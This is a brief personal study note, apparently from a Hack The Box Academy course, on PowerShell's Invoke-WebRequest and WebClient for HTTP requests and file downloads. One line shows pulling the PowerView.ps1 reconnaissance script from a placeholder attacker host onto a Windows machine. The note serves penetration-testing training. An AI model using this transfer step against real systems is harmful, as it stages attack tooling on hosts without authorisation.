
2025-04-21 11:17

Tags: #windows #shell #web #hands-on 

## Interacting With The Web

- Web interactions for:
	- Software updates
	- Data retrieval
	- Remote administration

- `Invoke-WebRequest`: cmdlet for **HTTP/HTTPS** communication, **get contents from a webpage**
	- Capable of sending ==GET/POST== requests, parsing HTML, handling sessions, authentication, and file downloads.
	- Aliased as `wget`, `iwr`, and `curl`

- **Web Request**: `Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET`
	- `-URI`: the address of the file/resource
	- `-Method`: kind of HTTP request (GET, POST, PUT,...)
	- `-OutFile`: write the downloaded to a file
	- Can pipeline with other cmdlets like `Get-Member, fl`,... to get the wanted contents

- **Transfer File** from attacker host:
	- Start a web HTTP server: `python3 -m http.server 8000`
	- Transfer: `Invoke-WebRequest -Uri "http://<attacker_ip>:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"`

- Addition to `Invoke-WebRequest`: .NET WebClient class
	- `(New-Object Net.WebClient).DownloadFile("https://example.com/file.zip", "file.zip")`

## References:

[Hack The Box - Academy](https://academy.hackthebox.com/module/167/section/1627)